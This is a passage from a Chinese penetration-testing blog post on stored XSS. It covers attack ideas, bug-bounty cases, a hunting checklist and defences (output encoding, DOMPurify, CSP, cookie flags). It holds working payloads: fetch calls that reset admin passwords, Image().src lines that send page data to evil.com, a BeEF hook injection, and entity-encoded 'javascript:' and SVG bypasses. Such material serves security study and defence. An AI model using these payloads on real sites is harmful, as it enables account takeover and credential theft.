+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 思路1：不偷 Cookie，借浏览器代劳</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/admin/user/edit&#x27;</span>, &#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>, <span class="attr">credentials</span>:<span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>:<span class="string">&#x27;id=1&amp;password=hacked123&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思路2：回传页面敏感数据</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/admin/user/list&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">d</span>=&gt;</span><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//evil.com/log?data=&#x27;</span>+<span class="title function_">btoa</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 思路3：TRACE 方法反射请求头</span></span><br><span class="line"><span class="keyword">var</span> x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); x.<span class="title function_">open</span>(<span class="string">&#x27;TRACE&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="literal">false</span>); x.<span class="title function_">send</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//evil.com/?&#x27;</span>+x.<span class="property">responseText</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SRC-实战案例"><a href="#SRC-实战案例" class="headerlink" title="SRC 实战案例"></a>SRC 实战案例</h2><h3 id="案例一：评论-XSS-→-管理员劫持"><a href="#案例一：评论-XSS-→-管理员劫持" class="headerlink" title="案例一：评论 XSS → 管理员劫持"></a>案例一：评论 XSS → 管理员劫持</h3><p>某电商平台商家后台：</p>
+<ol>
+<li>商品评论区提交 <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li>前台 HTML 编码为 <code>&amp;lt;img src=x...</code>——看似安全</li>
+<li>但后台评论审核列表用 <code>innerHTML</code> 直接渲染</li>
+<li>注入 Beef hook：<code>&lt;script src=&quot;http://x.x.x.x:3000/hook.js&quot;&gt;&lt;/script&gt;</code></li>
+<li>次日客服审核时中招，Beef 截屏确认为后台管理页</li>
+<li>用 Page Modification 模块修改密码表单 action，劫持管理员新密码 —— 高危，赏金 8000 元</li>
+</ol>
+<p><strong>教训：</strong> 同一数据前台&#x2F;后台渲染方式可能不同，必须两处都查。</p>
+<h3 id="案例二：富文本实体编码绕过"><a href="#案例二：富文本实体编码绕过" class="headerlink" title="案例二：富文本实体编码绕过"></a>案例二：富文本实体编码绕过</h3><p>某知识库系统自研编辑器：</p>
+<ol>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → 被删除；<code>&lt;img src=x onerror=alert(1)&gt;</code> → <code>onerror</code> 被删</li>
+<li><code>&lt;a&gt;</code> 标签允许 <code>href</code> 但拦截字符串 <code>javascript:</code></li>
+<li>HTML 实体绕过：<code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&quot;&gt;click&lt;/a&gt;</code> → 成功</li>
+<li>在文章末尾插入伪造登录框，访客输入凭证后外传至攻击者服务器</li>
+<li>文章公开可见，影响平台全部用户 —— 高危，赏金 5000 元</li>
+</ol>
+<h3 id="案例三：SVG-头像-EXIF-XSS"><a href="#案例三：SVG-头像-EXIF-XSS" class="headerlink" title="案例三：SVG 头像 + EXIF XSS"></a>案例三：SVG 头像 + EXIF XSS</h3><p>某社交平台：</p>
+<ol>
+<li>上传 SVG 头像含 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → WAF 拦截</li>
+<li>改用 <code>&lt;svg xmlns=&quot;...&quot;&gt;&lt;g onload=&quot;alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;</code> → 上传成功</li>
+<li>个人主页直接渲染 SVG → XSS 触发</li>
+<li>扩展：JPEG 图片 EXIF Comment 写入 payload，图片信息页输出来编码 → 再次触发</li>
+</ol>
+<p><strong>教训：</strong> SVG 是 XML，支持完整 JS 事件模型；EXIF 元数据也是不可信输入。</p>
+<hr>
+<h2 id="挖掘-Checklist"><a href="#挖掘-Checklist" class="headerlink" title="挖掘 Checklist"></a>挖掘 Checklist</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ ] 文本输入框：昵称、签名、标题、正文、评论区</span><br><span class="line">[ ] 文件上传：文件名、EXIF、SVG 内容、文件描述</span><br><span class="line">[ ] 富文本编辑器：事件属性、伪协议、iframe/embed</span><br><span class="line">[ ] 站内信/私信：收发两端渲染一致性</span><br><span class="line">[ ] 前台/后台同一数据渲染差异（重中之重）</span><br><span class="line">[ ] 换行、反引号、HTML 实体、Unicode 编码绕过</span><br><span class="line">[ ] SVG &lt;use&gt; / &lt;set&gt; / &lt;animate&gt; 冷门向量</span><br><span class="line">[ ] CSP 头是否限制 inline script 和 eval</span><br><span class="line">[ ] PUT/PATCH 接口过滤是否比 POST 松</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="1-输出编码——最后防线"><a href="#1-输出编码——最后防线" class="headerlink" title="1. 输出编码——最后防线"></a>1. 输出编码——最后防线</h3><p>按上下文选编码策略：</p>
+<table>
+<thead>
+<tr>
+<th>上下文</th>
+<th>编码</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 标签间</td>
+<td>HTML 实体</td>
+<td><code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;amp;</code> <code>&amp;quot;</code></td>
+</tr>
+<tr>
+<td>HTML 属性内</td>
+<td>属性编码</td>
+<td>同上 + 引号转义</td>
+</tr>
+<tr>
+<td>JavaScript 内</td>
+<td>Unicode 转义</td>
+<td><code>&lt;</code> <code>&gt;</code></td>
+</tr>
+<tr>
+<td>CSS 内</td>
+<td>CSS 转义</td>
+<td><code>\3C</code> <code>\3E</code></td>
+</tr>
+<tr>
+<td>URL 内</td>
+<td>URL 编码</td>
+<td><code>%3C</code> <code>%3E</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES | ENT_HTML5, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"><span class="comment">// Java JSTL</span></span><br><span class="line">&lt;c:out value=<span class="string">&quot;$&#123;input&#125;&quot;</span> /&gt;</span><br><span class="line"><span class="comment">// Python Django 自动转义</span></span><br><span class="line">&#123;&#123; input &#125;&#125;     <span class="comment">// 安全</span></span><br><span class="line">&#123;&#123; input|safe &#125;&#125; <span class="comment">// 危险！</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-富文本白名单过滤"><a href="#2-富文本白名单过滤" class="headerlink" title="2. 富文本白名单过滤"></a>2. 富文本白名单过滤</h3><p><strong>DOMPurify：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty, &#123;</span><br><span class="line">  <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;em&#x27;</span>,<span class="string">&#x27;strong&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;br&#x27;</span>,<span class="string">&#x27;ul&#x27;</span>,<span class="string">&#x27;ol&#x27;</span>,<span class="string">&#x27;li&#x27;</span>],</span><br><span class="line">  <span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;href&#x27;</span>,<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;target&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>服务端：Java: OWASP Java HTML Sanitizer &#x2F; PHP: HTML Purifier &#x2F; Python: Bleach &#x2F; .NET: HtmlSanitizer</p>
+<h3 id="3-CSP-纵深防御"><a href="#3-CSP-纵深防御" class="headerlink" title="3. CSP 纵深防御"></a>3. CSP 纵深防御</h3><p>即使 XSS 注入成功，CSP 也能阻止执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">  script-src &#x27;self&#x27; &#x27;nonce-&#123;random&#125;&#x27; &#x27;strict-dynamic&#x27;;</span><br><span class="line">  object-src &#x27;none&#x27;;</span><br><span class="line">  base-uri &#x27;self&#x27;;</span><br><span class="line">  report-uri /csp-violation-report;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>script-src &#39;self&#39;</code></td>
+<td>禁止内联 script &#x2F; 事件属性</td>
+</tr>
+<tr>
+<td><code>&#39;nonce-{random}&#39;</code></td>
+<td>配合 nonce 允许合法内联</td>
+</tr>
+<tr>
+<td><code>object-src &#39;none&#39;</code></td>
+<td>禁用 <code>&lt;embed&gt;</code>&#x2F;<code>&lt;object&gt;</code></td>
+</tr>
+<tr>
+<td><code>report-uri</code></td>
+<td>收集违规报告</td>
+</tr>
+</tbody></table>
+<h3 id="4-Cookie-加固"><a href="#4-Cookie-加固" class="headerlink" title="4. Cookie 加固"></a>4. Cookie 加固</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionId=abc; HttpOnly; Secure; SameSite=Strict; Path=/</span><br></pre></td></tr></table></figure>
+<p><strong>HttpOnly</strong> 禁止 JS 读取；<strong>Secure</strong> 仅 HTTPS；<strong>SameSite&#x3D;Strict</strong> 防跨站携带。</p>
+<h3 id="5-纵深防御流"><a href="#5-纵深防御流" class="headerlink" title="5. 纵深防御流"></a>5. 纵深防御流</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入校验(服务端) → 富文本清洗(白名单) → 输出编码(按上下文) → CSP头(最终兜底)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="常见踩坑"><a href="#常见踩坑" class="headerlink" title="常见踩坑"></a>常见踩坑</h2><p><strong>坑1：前端过滤当安全措施。</strong> 前端 JS 限制可被 Burp Suite 直接绕过，安全校验必须在服务端。</p>
+<p><strong>坑2：有 WAF 就不做输出编码。</strong> WAF 是特征匹配不是安全保底，输出编码必须做。</p>
+<p><strong>坑3：innerHTML 误用。</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="property">innerHTML</span> = user_input;   <span class="comment">// 危险：解析 HTML</span></span><br><span class="line">el.<span class="property">textContent</span> = user_input; <span class="comment">// 安全：纯文本</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>坑4：JSON.parse 后丢给 innerHTML。</strong> 服务端 JSON 编码了 HTML，parse 后恢复原字符串，innerHTML 照样解析。</p>
+<p><strong>坑5：<code>javascript:</code> 伪协议。</strong> 允许 <code>&lt;a&gt;</code> 标签时必须在 <code>href</code> 中屏蔽 <code>javascript:</code> 和 <code>data:</code>。</p>
+<p><strong>坑6：只测 POST 不测 PUT&#x2F;PATCH。</strong> 修改操作的过滤往往比创建操作松，两边都要覆盖。</p>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所述技术仅用于安全研究与授权的渗透测试活动。未经授权的测试、利用或攻击行为均属违法。作者不对读者滥用文中技术所产生的任何后果承担责任。所有安全测试须在获得明确书面授权的前提下进行，遵守《网络安全法》及相关法律法规。</p>
+</blockquote>
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/stored">PortSwigger - Stored XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://beefproject.com/">Beef Project</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.w3.org/TR/CSP3/">CSP Level 3</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-methodology/" rel="prev" title="Windows 提权方法论与工具链">
+                  <i class="fa fa-angle-left"></i> Windows 提权方法论与工具链
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-NTLM-relay/" rel="next" title="NTLM中继攻击实战">
+                  NTLM中继攻击实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
